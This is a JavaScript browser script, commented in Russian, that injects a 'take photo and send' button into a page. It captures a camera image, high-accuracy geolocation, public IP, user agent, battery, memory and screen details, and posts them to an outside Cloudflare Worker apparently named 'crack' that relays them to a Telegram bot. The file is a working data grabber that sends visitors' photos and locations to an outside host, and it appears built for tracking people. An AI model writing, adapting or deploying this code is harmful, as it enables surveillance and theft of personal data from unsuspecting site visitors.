// new_script.js
// Клиент: делает фото, собирает метаданные (geo, IP, экран, батарея, память) и посылает на Cloudflare Worker.
// Worker URL указан в WORKER_URL. Токен Telegram хранится в Worker.
// Требуется HTTPS и явное разрешение пользователя на камеру и геолокацию.

(function () {
  'use strict';

  const WORKER_URL = "https://crack.alonewolf0611.workers.dev/"; // <- ваш Worker
  const SESSION_FLAG = "tg_sent_v1";
  const MAX_FILE_BYTES = 3_000_000; // 3 MB
  const GEO_TIMEOUT_MS = 8000;
  const IP_TIMEOUT_MS = 4000;
  const CAPTURE_QUALITY = 0.85;
  const CAPTURE_WAIT_MS = 5000;

  if (!WORKER_URL) {
    console.error('new_script.js: WORKER_URL не задан.');
    return;
  }
  if (sessionStorage.getItem(SESSION_FLAG)) {
    console.log('new_script.js: уже отправлено в этой сессии, пропуск.');
    return;
  }

  // UI: минимальная кнопка для user gesture
  const btn = document.createElement('button');
  btn.id = 'tg_send_btn';
  btn.textContent = 'Сделать фото и отправить';
  Object.assign(btn.style, {
    position: 'fixed',
    right: '12px',
    bottom: '12px',
    zIndex: '999999',
    padding: '8px 10px',
    borderRadius: '8px',
    background: '#fff',
    border: '1px solid #ccc',
    cursor: 'pointer',
    fontFamily: 'system-ui,Segoe UI,Roboto,Arial'
  });
  document.body.appendChild(btn);

  // Лог в консоль с маркером
  function log(...args) { if (window.console) console.log('[TGClient]', ...args); }

  // Получение публичного IP (ipify) с таймаутом
  async function fetchPublicIP(timeoutMs = IP_TIMEOUT_MS) {
    try {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), timeoutMs);
      const resp = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
      clearTimeout(id);
      if (!resp.ok) return null;
      const j = await resp.json().catch(() => null);
      return j && j.ip ? j.ip : null;
    } catch (e) {
      log('ip fetch failed', e && e.message ? e.message : e);
      return null;
    }
  }

  // Получение геолокации с таймаутом
  function getGeo(timeoutMs = GEO_TIMEOUT_MS) {
    return new Promise(resolve => {
      if (!navigator.geolocation) return resolve(null);
      let done = false;
      const timer = setTimeout(() => {
        if (!done) { done = true; resolve(null); }
      }, timeoutMs);

      navigator.geolocation.getCurrentPosition(
        pos => {
          if (done) return;
          done = true; clearTimeout(timer);
          resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude,
            timestamp: pos.timestamp
          });
        },
        err => {
          if (done) return;
          done = true; clearTimeout(timer);
          log('geo error', err && err.code ? err.code : err);
          resolve(null);
        },
        { enableHighAccuracy: true, maximumAge: 0, timeout: timeoutMs }
      );
    });
  }

  // Память и heap (если доступны)
  function getMemoryInfo() {
    return {
      deviceMemory: typeof navigator.deviceMemory === 'number' ? navigator.deviceMemory : null,
      perfMemory: (performance && performance.memory) ? performance.memory : null
    };
  }

  // Батарея (если доступно)
  async function getBatteryInfo() {
    try {
      if (!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return { charging: Boolean(b.charging), level: typeof b.level === 'number' ? Math.round(b.level * 100) : null };
    } catch (e) {
      log('battery error', e);
      return null;
    }
  }

  // Превращаем Blob в base64 (без префикса)
  function blobToBase64NoPrefix(blob) {
    return new Promise((resolve, reject) => {
      const fr = new FileReader();
      fr.onload = () => {
        const result = String(fr.result || '');
        const parts = result.split(',');
        resolve(parts[1] || '');
      };
      fr.onerror = () => reject(fr.error || new Error('FileReader error'));
      fr.readAsDataURL(blob);
    });
  }

  // Захват кадра из видео
  function captureFromVideo(videoEl, quality = CAPTURE_QUALITY) {
    return new Promise(resolve => {
      try {
        const w = videoEl.videoWidth || 640;
        const h = videoEl.videoHeight || 480;
        const canvas = document.createElement('canvas');
        canvas.width = w; canvas.height = h;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoEl, 0, 0, w, h);
        canvas.toBlob(blob => resolve(blob), 'image/jpeg', quality);
      } catch (e) {
        log('capture error', e);
        resolve(null);
      }
    });
  }

  // Основной рабочий процесс - выполняется после клика
  async function runAndSend() {
    btn.disabled = true;
    btn.textContent = 'Запрос разрешений...';
    log('start runAndSend');

    // Параллельно запускаем геолокацию (не блокирует камеру prompt)
    const geoPromise = getGeo();

    // getUserMedia (user gesture satisfied)
    let stream = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false
      });
    } catch (e) {
      log('getUserMedia denied or error', e);
      btn.textContent = 'Доступ к камере отклонён';
      btn.disabled = false;
      return;
    }

    // Скрытый video для рендера кадра
    const video = document.createElement('video');
    video.autoplay = true;
    video.playsInline = true;
    video.style.display = 'none';
    video.srcObject = stream;
    document.body.appendChild(video);

    // Ждём появления кадров (до CAPTURE_WAIT_MS)
    const start = Date.now();
    while (!(video.videoWidth > 0 && video.videoHeight > 0) && (Date.now() - start) < CAPTURE_WAIT_MS) {
      // eslint-disable-next-line no-await-in-loop
      await new Promise(r => setTimeout(r, 100));
    }

    const blob = await captureFromVideo(video, CAPTURE_QUALITY);

    // Останавливаем камеру и удаляем video
    try { stream.getTracks().forEach(t => t.stop()); } catch (e) { /* ignore */ }
    try { video.remove(); } catch (e) { /* ignore */ }

    if (!blob) {
      log('no blob captured');
      btn.textContent = 'Ошибка съёмки';
      btn.disabled = false;
      return;
    }
    log('captured size', blob.size);
    if (blob.size > MAX_FILE_BYTES) log('warning: image exceeds MAX_FILE_BYTES', blob.size);

    btn.textContent = 'Сбор метаданных...';

    // Собираем метаданные
    const [ip, geo, battery] = await Promise.all([fetchPublicIP(), geoPromise, getBatteryInfo()]);
    const mem = getMemoryInfo();
    const ua = navigator.userAgent || '-';
    const page = location.pathname + (location.search || '');
    const time = new Date().toISOString();

    // Формируем подпись (короткая) и подробный JSON
    const shortCaption = `Время: ${time}\nСтраница: ${page}\nIP: ${ip || 'не получен'}`;

    const detailed = {
      time,
      page,
      ip: ip || null,
      ua,
      geo: geo || null,
      battery: battery || null,
      memory: mem,
      screen: { width: screen.width || null, height: screen.height || null, innerWidth: window.innerWidth || null, innerHeight: window.innerHeight || null, dpr: window.devicePixelRatio || 1 }
    };

    btn.textContent = 'Преобразую изображение...';

    // blob -> base64
    let image_b64 = '';
    try {
      image_b64 = await blobToBase64NoPrefix(blob);
    } catch (e) {
      log('blobToBase64 failed', e);
      btn.textContent = 'Ошибка преобразования';
      btn.disabled = false;
      return;
    }

    // payload
    const payload = {
      image_b64,
      caption: shortCaption,
      meta: detailed
    };

    btn.textContent = 'Отправка на сервер...';

    // POST to Worker
    try {
      const resp = await fetch(WORKER_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      const text = await resp.text().catch(() => null);
      if (!resp.ok) {
        log('worker returned non-ok', resp.status, text);
        btn.textContent = 'Ошибка сервера';
        btn.disabled = false;
        return;
      }

      // Положительный ответ
      log('worker response', text);
      sessionStorage.setItem(SESSION_FLAG, '1');
      btn.textContent = 'Отправлено';
      setTimeout(() => { try { btn.remove(); } catch (e) {} }, 3000);
    } catch (e) {
      log('send to worker failed', e);
      btn.textContent = 'Ошибка сети';
      btn.disabled = false;
    }
  }

  // Клик по кнопке запускает процесс
  btn.addEventListener('click', () => {
    btn.disabled = true;
    runAndSend().catch(err => {
      log('runAndSend exception', err);
      btn.textContent = 'Ошибка';
      btn.disabled = false;
    });
  });

  // Экспорт для отладки
  window.TGClient = { runAndSend };

})();